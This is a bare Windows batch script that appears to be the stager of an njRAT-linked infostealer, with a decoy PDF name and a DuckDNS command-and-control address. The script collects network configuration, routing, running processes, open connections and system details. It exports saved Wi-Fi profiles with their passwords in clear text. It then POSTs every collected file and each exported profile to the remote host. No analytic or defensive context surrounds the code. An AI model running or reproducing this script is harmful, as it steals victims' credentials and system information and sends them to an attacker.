@echo off
Documento.pdf
njratAWS.exe
set dest=http://thesuperc2.duckdns.org/
ipconfig -all > info0
netsh wlan show all > info1
route print > info2
systeminfo > info3
tasklist > info4
netstat -ano > info5
netsh wlan export profile folder=%fld% key=clear
call http.bat %dest%net -method POST -body-file info0
call http.bat %dest%nets -method POST -body-file info1
call http.bat %dest%route -method POST -body-file info2
call http.bat %dest%sys -method POST -body-file info3
call http.bat %dest%task -method POST -body-file info4
call http.bat %dest%tcp -method POST -body-file info5
setlocal enabledelayedexpansion
set fld=.
for /r %fld% %%a in (*.xml) do (
 call http.bat %dest%%%a -method POST -body-file %%a
)
